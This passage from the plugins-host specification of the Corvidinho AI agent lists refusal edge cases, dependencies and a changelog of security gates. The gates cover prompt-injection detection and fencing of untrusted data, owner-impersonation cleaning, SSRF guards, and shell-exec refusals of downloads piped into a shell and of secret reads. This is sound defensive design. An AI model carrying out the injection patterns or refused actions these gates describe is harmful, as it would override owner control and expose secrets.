| delegate from a non-ADMIN role session (ROLES-CHAT-3) | Refuse (exit 2, not allowed for your role); nothing spawned |
| delegate worker fails or times out | ok=false with worker exit / state and scrubbed summary |
| council while autonomous off / depth cap / below code tier / council budget spent | Refuse (exit 2); nothing spawned |
| council from a non-ADMIN role session (ROLES-CHAT-3) | Refuse (exit 2, not allowed for your role); nothing spawned |
| council chair fails / fewer than 2 proposals | ok=false (exit 1) with the transcript |
| council time cap or lead abort | ok=false (exit 130), state cancelled, voices stopped |
| fledge-* called from a cwd other than its bound project root | Refuse (exit 2); fledge not started |
| fledge-* times out / calling run aborts | exit 124 / 130; plugin process tree killed |
| fledge-lanes-run / fledge-run non-interactive + not allowlisted | Deny (exit 2, SAFE-1); fledge not started |
| fledge-lanes-run / fledge-run lane or task name not a plain name (leading `-`, space, `/`, empty), extra lanes-run args, or any fledge-lanes-list arg / non-`--strict` fledge-lanes-validate arg | Usage error (exit 1); fledge not started |
| fledge core builtin with no fledge on an absolute PATH entry | ok=false, exit 127 `<name>: fledge not on PATH`; never throws |
| fledge-lanes-validate on lanes with errors (or warnings under `--strict`) | ok=false with fledge's exit code (1), the errors and warnings |
| fledge-lanes-list / fledge-lanes-validate with a lane source (`fledge.toml`, `.fledge/lanes`, `.fledge/lanes/*.toml`) resolving outside the project, to a secret path, or to the wrong entry type | Refuse (exit 2) naming the project-relative path; fledge not started; contents and link target not returned |
| Fledge plugin command named `run` / `lanes-list` / `lanes-validate` / `lanes-run` | Skipped by the Fledge plugin load (`name already registered by builtin`); the builtin keeps the name |
| node / python3+python / cargo not on PATH at builtin load | Runner not registered or offered; `plugins list` names it `not loaded` and exits 0 (PLUGIN-4) |
| node-exec / python-exec / cargo-exec non-interactive + not allowlisted | Deny (exit 2, SAFE-1); nothing spawned |
| runner called with no argv | Usage error (exit 1); nothing spawned |
| runner binary gone after load (cannot start) | ok=false, exit 127 with the reason; never throws |
| runner times out / calling run aborts | exit 124 / 130; runner process tree killed |
| files-read of a PNG/JPEG/GIF/WebP over 20 MB | refused `refused: image '<path>' is N bytes, over the 20MB image limit` (exit 1), no bytes read into the result (REQ-plugins-427) |
| discord-user-lookup member names carrying mention markup, invisible / bidi / tag characters or role-like tags / labels | returned cleaned (`cleanDisplayName`); a name that is only a role word is dropped (the username or id stands in) (REQ-plugins-071) |
| A role session's task text claims the owner and asks for a mutating plugin | not offered; a call gets the role refusal `not allowed for your role`, nothing runs (REQ-plugins-071, REQ-plugins-065) |
| specsync-change-new / -answer where the SpecSync change workflow is off | `SDD_OFF_REFUSAL` (exit 2); nothing spawned (REQ-plugins-518) |
| specsync-change-new / -answer / -status / -approve / -finalize with `--root` | refused (exit 1); nothing spawned (REQ-plugins-518) |
| specsync-change-answer acceptance_criteria in a hi repo citing no hi id, an id hi does not show as captured, or with `hi export` unreadable | refused (exit 2) naming why; nothing spawned (REQ-plugins-518) |
| specsync-change-approve / -finalize outside Corvidinho | `HUMAN_LIFECYCLE_LINE` (exit 2); nothing spawned (REQ-plugins-519) |
| specsync-change-approve / -finalize on Corvidinho for a change this run did not open, before its lane is green, in WATCH / a schedule / a worker / a community run | refused (exit 2) with the reason; nothing spawned (REQ-plugins-519) |
| specsync-change-finalize step fails | ok=false naming the step (`check`, `review` or `finalize`); later steps not run (REQ-plugins-519) |

## Dependencies

| Module | What is used |
|--------|-------------|
| Bun | `Bun.which`, `Bun.spawn`, `Bun.file`, `Bun.write` |
| @octokit/rest | REST list/view/checks + create/comment/review for gated write commands |
| node:fs / path | path clamp, symlink resolve, glob/list, shell cwd pin |
| sh | shell-exec child via `sh -c` |
| node / python3 / python / cargo (optional system binaries) | language runners via `Bun.spawn` argv arrays, only when on PATH |
| src/agent/verify.ts | `buildVerifyEnv` scrub for the language runners' and Fledge core builtins' child env |
| fledge (optional system binary) | Fledge core builtins (`lanes list` / `lanes validate` / `lanes run`, `run`) and the Fledge plugin bridge, via `Bun.spawn` argv arrays |
| node:dns / net / tls | web-fetch resolve once, dial pinned IP, SNI + cert check |
| src/store/scrub.ts | `scrubSecrets` on web-fetch output and errors; secret-bearing URLs refused |
| src/discord/image-attachments.ts | `MAX_IMAGE_SIZE_BYTES` / `ImageMediaType` for files-read image mode (DISCORD-9) |
| git (system binary) | git plugins via `Bun.spawn` argv arrays |
| /proc (Linux) | process-tree walk for bounded child stops (proc-group) |

## Change Log

Plugin reload-after-clearRegistry for HEAR #13 fixtures (2026-09-26). Historical
and current rows for plugins host evolution.

| 2026-09-26 | discord-user-lookup read-only guild member resolve (REQ-plugins-312 / IDENTITY-5) |
| 2026-09-26 | dogfood-ux-discord-identity-inject-identity-4-thinking-embed-model-plumbing-discord-3-a-clean-chat-replies-community: ROLES-CHAT-8 community public GitHub gate + secret-path read refuse |
| 2026-09-26 | github-write-plugins-issue-48: dangerous issue/PR create comment review + attribution; SAFE-1 + GITHUB-6 |
| 2026-09-26 | memory-sqlite-acl issues #41 #59: MEMORY SQLite + ACL; package 0.0.4 |
| 2026-09-26 | plugin-file-and-search-tools-with-protected-paths-plugin-1-2-safe-2-issue-81: files-read/write/edit/glob/list/delete + search-grep; SAFE-2 protected paths; path clamp; package 0.0.6 |
| 2026-09-26 | cover-leftover-plugins-list-smoke-test-ts-for-specsync-audit-after-files-search-81-archive: Cover leftover plugins.list.smoke.test.ts for SpecSync audit after files/search #81 archive |
| 2026-09-26 | memory-discord-inject: richer memory-* argv descriptions (REQ-plugins-085) |
| 2026-09-26 | discord-memory-auto-recall-inject-on-spawn-plus-system-prompt-store-recall-rules-agent-7-memory-2-4-draft-67-behavior: Discord MEMORY auto-recall inject on spawn plus system-prompt store/recall rules (AGENT-7 MEMORY-2/4 draft #67 behavior) package 0.0.7 |
| 2026-09-26 | harden-memory-plugin-acl-memory-acl-1-4-safe-4-issue-59-follow-up-acting-discord-user-and-admin-come-only-from-bridge: Harden memory plugin ACL (MEMORY-ACL-1..4 / SAFE-4 / issue #59 follow-up): acting Discord user and ADMIN come only from bridge-set env never model argv (--user/--admin/--db refused); ADMIN re-checked at handler time against live admin config with empty=deny-all; include-deleted is ADMIN-only; forget/override become real two-phase with an HMAC confirm token confirmed from a different turn; Discord/WATCH spawns always overwrite acting env |
| 2026-09-26 | safe-5-tamper-evident-audit-trail-issue-95-captured-slice-append-only-audit-log-schema-v5-update-delete-blocked-by: SAFE-5 tamper-evident audit trail (issue #95 captured slice): append-only audit_log (schema v5, UPDATE/DELETE blocked by triggers) with an HMAC-SHA256 chain keyed by CORVIDINHO_AUDIT_HMAC_KEY from the bot VM env (plain SHA-256 integrity chain when unset); runPlugin records every dangerous plugin run (started then ok/error, fail closed if the intent cannot be recorded) and denied close calls, storing action, actor, surface, args digest and outcome, never raw args; verify at bridge start and a chain-status line in /status; busy_timeout on the shared DB; tests isolate the data dir; draft SAFE-17 Discord verify command left for HI capture |
| 2026-09-26 | memory-plugins-treat-the-configured-owner-as-admin-identity-1-42-companion-the-handler-time-admin-re-check-for-memory: Memory plugins treat the configured owner as ADMIN (IDENTITY-1, #42 companion): the handler-time ADMIN re-check for memory forget/override/include-deleted also accepts the owner's Discord snowflake from the owner config, still requiring the bridge's per-dispatch admin bit and never for muted or deny-listed owners |
| 2026-09-26 | shell-exec-plugin-with-safe-3-project-root-cwd-clamp-plugin-1-2-safe-3-issue-83-package-0-0-9: shell-exec + SAFE-3 cwd clamp; package 0.0.9 |
| 2026-09-26 | strict-identity-2-admin-is-owner-only-issue-42-leif-decision-admin-user-role-env-lists-no-longer-grant-admin-no-owner: Strict IDENTITY-2: ADMIN is owner-only (issue #42, Leif decision). Admin user/role env lists no longer grant ADMIN; no owner means nobody is ADMIN (IDENTITY-3); bridge and doctor warn when legacy admin lists are set |
| 2026-09-26 | web-fetch-plugin-ssrf-guarded-issue-111-plugin-1-2-safe-7-new-plugins-web-with-one-get-only-web-fetch-command-http: Web-fetch plugin, SSRF-guarded (issue #111, PLUGIN-1/2, SAFE-7): new plugins/web with one GET-only web-fetch command; http/https only; DNS resolved and every address checked against loopback, private, CGNAT, link-local/metadata, unique-local, multicast, unspecified, reserved and IPv4-mapped/NAT64 forms; the checked IP is pinned for the socket while Host and SNI keep the original name; redirects followed manually (max 5) and re-checked per hop; 1 MiB body and 15s total caps; text content types only; output control-stripped, scrubbed and fenced as untrusted data (title inside the fence, no echo of server text); URLs carrying secrets refused; 100k-char text cap; dangerous true (SAFE-1 consent), minTier 1; web-search left for HI capture |
| 2026-09-26 | plugin-vcs-tools-status-diff-log-branch-commit-push-with-cwd-clamp-no-force-repo-gate-plugin-1-2-safe-1-2-3-github-2-6: git-status/diff/log/branch-list reads + dangerous code-tier git-branch-create/commit/push; cwd clamped to the worktree top level, explicit-path commits, never force, GITHUB-6 push gate (issue #82, REQ-plugins-182); draft SAFE-22 left for HI |
| 2026-09-26 | autonomous-1-gate-and-depth-capped-delegate-tool-issue-117: `delegate` autonomous plugin (PLUGIN-5, AUTONOMOUS-5, SAFE-9), `PluginCommand.autonomous`, handler tier + signal pass-through (REQ-plugins-117) |
| 2026-09-26 | autonomous-1-gate-and-depth-capped-delegate-tool-issue-117-autonomous-1-5-safe-9-autonomous-mode-off-until-corvidinho: AUTONOMOUS-1 gate and depth-capped delegate tool (issue #117, AUTONOMOUS-1/5, SAFE-9): autonomous mode off until [corvidinho.autonomous] enabled = true in the project fledge.toml; a code-tier lead can delegate a skill-tagged subtask to a worker (child task run, same-or-lower tier, non-interactive, depth <= 2, capped fan-out) and synthesize its summary; delegate stays hidden from the tool catalog unless the session is allowed |
| 2026-09-26 | call-registered-fledge-plugins-as-tools-issue-112-fledge-4-5-plugin-2-3-6-discover-the-project-s-fledge-plugins-via-the: Call registered Fledge plugins as tools (issue #112, FLEDGE-4/5 PLUGIN-2/3/6): discover the project's Fledge plugins via the fledge CLI, register each command as a dangerous typed plugin run through fledge plugins run with argv arrays, and show per-command tool schema cost plus a context budget line in plugins list |
| 2026-09-26 | roles-chat-tool-gates-non-admin-read-chat-catalog-refuse-mutating-at-run-time-admin-still-behind-safe-tests-roles-chat: ROLES-CHAT-2..6 mutating role gates |
| 2026-09-26 | web-fetch-htmltotext-strips-tags-to-a-capped-fixpoint-so-split-tags-cannot-reassemble-codeql-incomplete-multi-character: Web-fetch htmlToText strips tags to a capped fixpoint so split tags cannot reassemble (CodeQL incomplete multi-character sanitization on #148) |
| 2026-09-26 | github-ci-status-for-a-pr-or-ref-with-an-overall-ci-verdict-incl-legacy-commit-statuses-github-4-issue-94-captured: github-ci-status takes a PR number or a ref (branch/tag/SHA; git ref-name validation, option-looking refused) and reports verdict green/red/pending/none over check runs plus legacy commit statuses; rows keep name/state/bucket/link (REQ-plugins-094, GITHUB-4 / #94 captured slice; draft GITHUB-11 left for HI capture) |
| 2026-09-26 | github-pr-review-reads-issue-93-captured-slice-github-3-github-1-read-only-github-pr-diff-unified-diff-capped-at-200: GitHub PR review reads (issue #93 captured slice, GITHUB-3 / GITHUB-1): read-only github-pr-diff (unified diff capped at 200 KiB with a truncation marker, optional --file PATH filter) and github-pr-files (changed files with status/additions/deletions, paginated to a cap) in plugins/github/review.ts; dangerous false, minTier 0, GITHUB-6 repo gate; SAFE-6 scrub on returned text; diff returned as untrusted data; draft GITHUB-10 confidence score left for HI capture |
| 2026-09-26 | spawned-agents-pin-bun-config-to-a-known-empty-file-and-safe-2-protects-bunfig-toml-so-a-planted-preload-cannot-run: Spawned agents pin Bun config to a known-empty file and SAFE-2 protects bunfig.toml so a planted preload cannot run code in the agent (#133 isolation / SAFE-1) |
| 2026-09-26 | files-path-clamp-follows-dangling-symlinks-by-hand-so-files-write-cannot-escape-the-project-root-or-create-safe-2: Files path clamp follows dangling symlinks by hand so files-write cannot escape the project root or create SAFE-2 protected files through a link whose target does not exist yet |
| 2026-09-26 | harden-admin-and-github-pr-diff-edges-admin-mutations-fail-closed-when-no-audit-trail-is-wired-allowlist-json-toml: Harden /admin and github-pr-diff edges: /admin mutations fail closed when no audit trail is wired, allowlist JSON/TOML detection shares the loader rule, dangling allowlist symlinks are refused not replaced, empty --file is a usage error, pure rename/copy/mode changes say content unchanged and copies get copy from/to lines |
| 2026-09-26 | council-tool-issue-118-autonomous-6-safe-9-a-code-tier-lead-in-an-autonomous-enabled-project-can-convene-a-council-of-2: Council tool (issue #118, AUTONOMOUS-6, SAFE-9): a code-tier lead in an autonomous-enabled project can convene a council of 2-5 delegated voices that deliberate in structured phases (propose, critique, decide) and get back a bounded transcript and a synthesized decision; voices run read tier by default with no mutating tools, reuse delegate caps and worker env stripping, and the tool stays hidden unless the session is allowed |
| 2026-09-26 | plugin-argv-keeps-tokens-that-start-with-files-write-content-files-edit-strings-shell-exec-command-flags-search-grep: Plugin argv keeps tokens that start with -- (files-write content, files-edit strings, shell-exec command flags, search-grep patterns) and files-write refuses to empty a non-empty file without --allow-empty |
| 2026-09-26 | github-plugin-repo-gate-reads-the-allowlist-file-plus-env-overlays-so-file-deny-lists-apply-and-file-only-allow-lists: GitHub plugin repo gate reads the allowlist file plus env overlays so file deny lists apply and file-only allow lists work (GITHUB-6, ALLOW-4) |
| 2026-09-26 | files-edit-single-occurrence-replace-writes-new-literally-so-dollar-replacement-patterns-cannot-corrupt-the-file: Files-edit single-occurrence replace writes --new literally so dollar replacement patterns cannot corrupt the file (plugins-exec-5) |
| 2026-09-26 | test-suite-never-reads-the-operator-allowlist-file-preload-and-custom-env-tests-point-corvidinho-allowlist-file-at-a: Test suite never reads the operator allowlist file (preload and custom-env tests point CORVIDINHO_ALLOWLIST_FILE at a missing file) and a malformed allowlist file makes the GitHub plugin gate refuse (REQ-plugins-253) |
| 2026-09-26 | shell-exec-safe-3-cd-clamp-skips-cd-options-prefix-words-and-quoting-refuses-cd-expansions-and-cdpath-jumps-and-drops: Shell-exec SAFE-3 cd clamp skips cd options, prefix words and quoting, refuses cd -, expansions and CDPATH jumps, and drops inherited CDPATH/OLDPWD so shell-exec cannot run outside the project root |
| 2026-09-26 | harden-child-process-lifetimes-and-fledge-scoping-issue-112-follow-up-to-154-157-167-fledge-plugin-argv-after-own: Harden child process lifetimes and Fledge scoping (issue #112 follow-up to #154, #157, #167): fledge plugin argv after --, own process group plus tree kill on timeout or abort for Fledge runs, delegate workers and schedule runs, daemon shutdown kills abandoned runs, Fledge commands scoped to the project root they were discovered for |
| 2026-09-26 | audit-append-and-safe-6-re-scrub-take-the-sqlite-write-lock-up-front-begin-immediate-so-busy-timeout-applies-and: Audit append and SAFE-6 re-scrub take the SQLite write lock up front (BEGIN IMMEDIATE) so busy_timeout applies and concurrent writers wait instead of failing with database is locked (SAFE-5, SAFE-6) |
| 2026-09-26 | safe-3-shell-exec-cd-clamp-fails-closed-on-redirections-quote-aware-tokenizing-backslash-newline-continuations-expanded: SAFE-3 shell-exec cd clamp fails closed — quote-aware tokenizer joins `\`-newlines, drops redirections (never splitting a redirection `&`), refuses expanded command words, `eval` with expansion, escaping cd inside command substitutions and DIRSTACK writes; CDPATH protection moves to the child shell's `CDPATH=; readonly CDPATH` (dropped CDPATH/OLDPWD env) so a dynamic CDPATH cannot redirect a relative cd; closes PR #187 review findings |
| 2026-09-26 | allowlist-file-toml-reader-loads-multi-line-arrays-and-fails-closed-on-anything-it-cannot-parse-so-file-deny-lists-are: Allowlist file TOML reader loads multi-line arrays and fails closed on anything it cannot parse, so file deny lists are never silently dropped |
| 2026-09-27 | concurrent-audit-appends-from-several-processes-lose-no-safe-5-rows-regression-test-for-req-plugins-287-multi-process: Concurrent audit appends from several processes lose no SAFE-5 rows: regression test for REQ-plugins-287 multi-process acceptance (review follow-up for PR 211) |
| 2026-09-26 | safe-5-audit-verify-rejects-unkeyed-rows-after-a-keyed-row-and-appendaudit-refuses-unkeyed-appends-to-a-keyed-chain-so: SAFE-5 audit verify rejects unkeyed rows after a keyed row and appendAudit refuses unkeyed appends to a keyed chain so keyed rows cannot be relinked as unkeyed SHA-256 |
| 2026-09-26 | safe-3-shell-exec-cd-clamp-fails-closed-on-redirections-quote-aware-tokenizing-backslash-newline-continuations-expanded: SAFE-3 shell-exec cd clamp fails closed — quote-aware tokenizer joins `\`-newlines, drops redirections (never splitting a redirection `&`), refuses expanded command words, `eval` with expansion, escaping cd inside command substitutions and DIRSTACK writes; CDPATH protection moves to the child shell's `CDPATH=; readonly CDPATH` (dropped CDPATH/OLDPWD env) so a dynamic CDPATH cannot redirect a relative cd; closes PR #187 review findings |
| 2026-09-26 | allowlist-file-toml-reader-loads-multi-line-arrays-and-fails-closed-on-anything-it-cannot-parse-so-file-deny-lists-are: Allowlist file TOML reader loads multi-line arrays and fails closed on anything it cannot parse, so file deny lists are never silently dropped |
| 2026-09-27 | safe-5-audit-req-plugins-095-states-the-keyed-downgrade-guarantee-accurately-verify-catches-an-unkeyed-row-after-a: SAFE-5 audit REQ-plugins-095 states the keyed-downgrade guarantee accurately: verify catches an unkeyed row after a keyed row, but downgrading every keyed row or dropping the newest rows needs an out-of-DB anchor; go-live doc says a keyless process refuses dangerous runs on a keyed chain |
| 2026-09-27 | specsync-read-and-specsync-brief-refuse-module-names-that-are-not-a-plain-module-name-and-never-read-a-file-whose-real: Specsync-read and specsync-brief refuse module names that are not a plain module name and never read a file whose real path is outside the project specs dir; coverage, change-list and ship-status refuse --root |
| 2026-09-27 | search-grep-files-glob-and-files-list-refuse-and-hide-secret-paths-for-non-admin-role-sessions-like-files-read-roles: Search-grep, files-glob and files-list refuse and hide secret paths for non-ADMIN role sessions like files-read (ROLES-CHAT-8) |
| 2026-09-27 | discord-dogfood-member-user-lookup-for-snowflakes-identity-5-discord-13-soft-land-tool-round-exhaustion-without-dumping: Discord dogfood: member/user lookup for snowflakes (IDENTITY-5/DISCORD-13), soft-land tool-round exhaustion without dumping Stopped after N (AGENT-9), chat prefers prose over SpecSync/github thrash (ROLES-CHAT-9); package 0.0.28 |
| 2026-09-27 | safe-3-shell-exec-cd-clamp-reads-quoting-the-way-the-shell-does-escaped-backslash-before-a-newline-comments-and-here: SAFE-3 shell-exec cd clamp reads quoting the way the shell does: escaped backslash before a newline, comments and here-doc bodies no longer hide a cd, the end of a command substitution is found with the same tokenizer, and a cd/pushd command left open by a quote or trailing backslash is refused |
| 2026-09-27 | local-spec-check-runs-at-the-ci-spec-sync-strictness-specsync-check-require-coverage-100-specsync-check-falls-back-to: Local spec-check runs at the CI Spec Sync strictness (specsync check --require-coverage 100), specsync-check falls back to specsync check when the project defines no Fledge spec-check task, and a read-only specsync-score tool reports SpecSync spec scores (SPECSYNC-2/3, issue 89) |
| 2026-09-27 | plugin-4-language-runner-plugins-node-exec-python-exec-and-cargo-exec-register-when-node-python3-python-or-cargo-is-on: PLUGIN-4 language runner plugins: node-exec, python-exec and cargo-exec register when node, python3/python or cargo is on PATH and degrade cleanly when the toolchain is missing (dangerous, code tier, argv only, cwd pinned to the project root) |
| 2026-09-27 | files-read-passes-images-to-the-model-as-image-parts-it-can-see-with-a-one-shot-text-fallback-for-models-without-vision: Files-read passes images to the model as image parts it can see, with a one-shot text fallback for models without vision (DISCORD-9) |
| 2026-09-27 | specsync-module-listing-falls-back-to-the-specs-dir-when-specsync-registry-toml-is-absent-so-specsync-list-specsync: SpecSync module listing falls back to the specs dir when .specsync/registry.toml is absent, so specsync-list, specsync-read and the Planning spec briefing (with companions) work in a standard SpecSync project (SPECSYNC-1, SPECSYNC-5); a registry.toml that exists adds its names to the specs-dir modules instead of hiding modules scaffolded after it |
| 2026-09-27 | safe-2-file-tools-refuse-any-keystore-file-or-directory-inside-the-project-and-specsync-s-specsync-config-registry-and: SAFE-2: file tools refuse any keystore file or directory inside the project and SpecSync's .specsync/ config, registry and archive (active change folders stay writable) |
| 2026-09-27 | plugin-1-fledge-itself-as-typed-builtins-fledge-lanes-list-and-fledge-lanes-validate-read-only-and-fledge-lanes-run-and: PLUGIN-1 Fledge itself as typed builtins: fledge-lanes-list and fledge-lanes-validate (read-only) and fledge-lanes-run and fledge-run (dangerous, code tier) wrap the local fledge CLI in the project root |
| 2026-09-27 | safe-3-shell-exec-cd-clamp-checks-the-scripts-a-command-runs-in-a-shell-sourced-handed-to-a-shell-as-a-file-here-doc-or: SAFE-3 shell-exec cd clamp checks the scripts a command runs in a shell (sourced, handed to a shell as a file, here-doc or here-string, or run by path) and trap actions, refuses alias definitions and shells reading commands from an unknown input, and reads sh -c - and option clusters like -co pipefail |
| 2026-09-29 | three-roles-owner-team-and-community-gate-every-tool-each-declared-person-has-one-role-set-only-by-the-owner-role-key: Three roles: owner, team and community gate every tool. Each declared person has one role set only by the owner (role key or audited /admin people role); the tool layer re-resolves the actor's role from the people registry on every run and surface (runPlugin + catalog): owner keeps everything, team gets /work edits and PR, GitHub reviews and comments on allowlisted repos and only their own memory, community (and anyone undeclared, WATCH, schedules, workers) keeps today's read/chat tools; community site/roadmap sources are the public repo docs and the public issues and milestones of allowed public repos (IDENTITY-8..12, ADMIN-3.b, ROLES-CHAT-8.a, #65) |
| 2026-09-29 | person-and-project-memory-private-notes-and-forget-me-on-an-owner-approve-deny-card-each-declared-person-keeps-one: Person and project memory, private notes, and forget-me on an owner Approve/Deny card: each declared person keeps one profile keyed by person id (role, projects, preferences, history of decisions, asks and approvals), each project keeps memory keyed by its repo for whoever works on it next, a person's memory and private notes are shown only to them and the owner on every surface, and anyone can ask to be forgotten, which deletes their memories once the owner approves on a DM Approve/Deny card (MEMORY-5/6/7, MEMORY-ACL-6, #101) |
| 2026-09-29 | memory-on-discord-and-github-filed-by-person-or-project-and-a-memory-search-before-i-don-t-know-a-github-watch-run: Memory on Discord and GitHub, filed by person or project, and a memory search before I don't know: a GitHub WATCH run saves and recalls for the commenter's declared person (people list, stable GitHub ids) with MEMORY-7 privacy while an undeclared commenter reads only the thread repo's project memory and saves nothing (REQ-watch-008 changed); a recall with a query is ranked by relevance then recency; the Discord and WATCH injects search memory for the message; the tool loop searches memory itself before a reply that says it doesn't know, costing a model call only when facts are found (MEMORY-8, MEMORY-9, #67) |
| 2026-09-29 | allowlist-loader-expands-a-leading-in-corvidinho-allowlist-file-to-home-so-the-documented-env-example-no-longer: Allowlist loader expands a leading ~ in CORVIDINHO_ALLOWLIST_FILE to HOME so the documented .env example no longer silently drops the file's deny lists and owner |
| 2026-09-29 | a-deny-listed-thread-under-an-allowlisted-parent-is-refused-silently-on-every-path-deny-wins-discord-5-req-plugins-005: A deny-listed thread under an allowlisted parent is refused silently on every path: deny wins (DISCORD-5, REQ-plugins-005) |
| 2026-09-29 | discord-post-message-gates-on-the-bridge-s-channel-set-allowlist-file-and-corvidinho-discord-allow-channels-union: Discord-post-message gates on the bridge's channel set (allowlist file and CORVIDINHO_DISCORD_ALLOW_CHANNELS union DISCORD_CHANNEL_IDS), so a channel allowlisted only through DISCORD_CHANNEL_IDS can be posted to; deny lists still win |
| 2026-09-29 | security-gate-tests-fail-when-the-gate-is-removed-safe-2-refuses-every-specs-path-github-deny-users-and-deny-orgs-win: Security gate tests fail when the gate is removed: SAFE-2 refuses every specs/ path, GitHub deny_users and deny_orgs win in WATCH and git-push, a community session is refused a private repo through the real visibility lookup, and the live DISCORD-8 requester check is exercised |
| 2026-09-29 | schedule-result-and-ask-posts-name-the-project-never-its-absolute-host-path-a-tampered-unkeyed-audit-chain-reads-chain: Schedule result and ask posts name the project, never its absolute host path; a tampered unkeyed audit chain reads chain BROKEN at #N without an HMAC key |
| 2026-09-29 | verify-retry-feedback-never-ends-on-half-a-surrogate-pair-a-non-git-lead-verifies-after-a-delegate-worker-that-returned: Verify retry feedback never ends on half a surrogate pair; a non-git lead verifies after a delegate worker that returned no result frame; github-pr-create attribution check is exact; doctor and the Octokit plugins treat a blank GITHUB_TOKEN / GH_TOKEN as missing |
| 2026-09-29 | safe-5-safe-6-regression-tests-audit-chain-tamper-on-any-audit-log-column-dangerous-run-error-rows-with-exit-codes-re: SAFE-5/SAFE-6 regression tests: audit chain tamper on any audit_log column, dangerous-run error rows with exit codes, re-scrub of every listed column, and the bridge start and /status audit line from the real DB and key |
| 2026-09-29 | prompt-injection-hygiene-display-names-are-cleaned-before-the-model-sees-them-and-a-name-that-imitates-the-owner-or-a: Prompt-injection hygiene: display names are cleaned before the model sees them and a name that imitates the owner or a declared person is flagged, identity and role still only from declared ids (SAFE-11); a non-owner's chat, /session start and /work text, WATCH issue/PR/comment titles and bodies, and GitHub reader and guild-member tool results reach the model fenced as untrusted data, and the system prompt says such blocks never grant permission (SAFE-12); a conservative always-on detector refuses a non-owner message or WATCH event that looks like an injection attempt before any run with one short reply that tells the owner, and a tool result that trips it drops every mutating tool for the rest of the run and tells the owner on the answer, every hit audited (SAFE-13, #71) |
| 2026-09-30 | forget-from-github-and-from-admin-approved-on-the-card-a-declared-person-matched-by-github-numeric-id-who-comments: Forget from GitHub and from /admin, approved on the card: a declared person (matched by GitHub numeric id) who comments 'forget me' to the watch user raises the owner's existing Approve/Deny forget card with no model run and gets a reply on the thread (an undeclared sender is told nothing is kept, no card), the outcome is posted on that thread; the owner can start a forget for any declared person with owner-only, SAFE-5 audited /admin people forget, the same card; either way nothing is forgotten until the owner approves, and Approve also deletes the person's kept WATCH conversations by the GitHub login and numeric id the ask came from, never the owner who started it (MEMORY-ACL-6.a, #101) |
| 2026-09-29 | private-notes-profile-reads-and-the-owner-s-view-of-someone-s-memory-are-shown-only-privately-in-a-discord-conversation: Private notes, profile reads and the owner's view of someone's memory are shown only privately: in a Discord conversation the memory plugins hand that text past the model (privateText; the model gets a sent-privately placeholder), task run carries it as privateReplies, and the bridge sends it by DM to whoever asked on chat, button pick and Answer form resumes, /session start and /work, with a short sent-privately note in the channel and never the text; refused in schedules and GitHub threads (MEMORY-7.a, #101) |
| 2026-09-30 | on-github-people-match-only-by-their-numeric-user-id-a-renamed-or-re-registered-login-never-counts-as-the-owner-or-a: On GitHub people match only by their numeric user id: a renamed or re-registered login never counts as the owner or a declared person on WATCH (prompt, memory scope, SAFE-13 exemption); [owner] github_id declares the owner's id; /admin people link github stores the looked-up numeric id; doctor warns about logins without an id (IDENTITY-7.a, #36) |
| 2026-09-30 | safe-2-a-the-file-tools-refuse-fledge-like-fledge-toml-and-specs-so-a-run-cannot-weaken-the-verify-lane-it-is-judged-by: SAFE-2.a: the file tools refuse .fledge/ like fledge.toml and specs/, so a run cannot weaken the verify lane it is judged by |
| 2026-09-30 | shell-exec-refuses-foot-guns-and-says-why-sed-i-or-edits-downloads-piped-into-a-shell-deletes-outside-the-worktree: Shell-exec refuses foot-guns and says why (sed -i or > edits, downloads piped into a shell, deletes outside the worktree, secret reads), env -C and symlinked cd can't leave the root, and the shell and language runners start without GitHub or git credentials (SAFE-21, SAFE-21.a, SAFE-3) |
| 2026-09-30 | scheduled-runs-read-and-act-only-on-repos-the-owner-allowlists-even-public-ones-discord-schedule-3-a-in-a-schedule-run: Scheduled runs read and act only on repos the owner allowlists, even public ones (DISCORD-SCHEDULE-3.a): in a schedule run and its delegate/council workers (CORVIDINHO_DISCORD_SESSION_ID schedule_*, SCHEDULE_SESSION_PREFIX / isScheduleRunEnv) the GitHub tools, review readers and docs/milestone readers refuse a repo off the GITHUB-6 allowlist with no visibility lookup (deny still wins, role rules still apply on top); web-fetch refuses GitHub-host URLs that do not name an allowlisted OWNER/REPO at every hop, redirects included; a schedule project that lies in a git checkout nested inside the bridge root needs an allowlisted origin at /schedule create and every tick |
| 2026-09-30 | it-asks-me-on-an-approve-card-before-touching-prod-or-deploys-or-making-a-channel-post-anything-else-it-just-does-and: It asks me on an Approve card before touching prod or deploys or making a channel post; anything else it just does and tells me (AUTONOMY-9/9.a, AUTONOMY-10/10.a channel posts, AUTONOMY-11, #97) |
| 2026-09-30 | if-a-model-fails-or-is-retired-it-falls-back-to-my-next-configured-model-and-tells-me-agent-11: If a model fails or is retired it falls back to my next configured model and tells me (AGENT-11) |
| 2026-09-30 | fledge-lane-and-task-runs-start-without-my-github-or-git-credentials-like-the-shell-and-the-runners-now-that-my-talks: Fledge lane and task runs start without my GitHub or git credentials, like the shell and the runners, now that my talks may be offered them (SAFE-21.a, SAFE-3.a) |
